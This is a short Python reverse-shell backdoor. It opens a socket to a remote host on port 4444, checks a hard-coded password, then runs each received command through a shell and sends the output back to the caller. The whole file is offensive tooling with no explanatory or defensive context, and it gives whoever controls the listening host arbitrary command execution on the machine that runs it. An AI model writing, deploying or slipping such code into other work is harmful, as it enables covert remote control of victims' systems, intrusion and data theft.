
import subprocess
import socket

host='0.0.0.0'
port=4444


def login():
    global s
    Login="login : "
    s.send(Login.encode('utf-8'))
    pwd=s.recv(6000)
    
    if pwd.strip() != 'cyber_norse':
        login() 
    else :
        s.send('connected--|>')
        shell()
        
def shell():
    while True :
        data=s.recv(6000)
        if data.strip() == ":kill":
            break
        proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=proc.stdout.read()+proc.stderr.read()
        s.send(output)
        s.send('#>')
        
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
login()
        
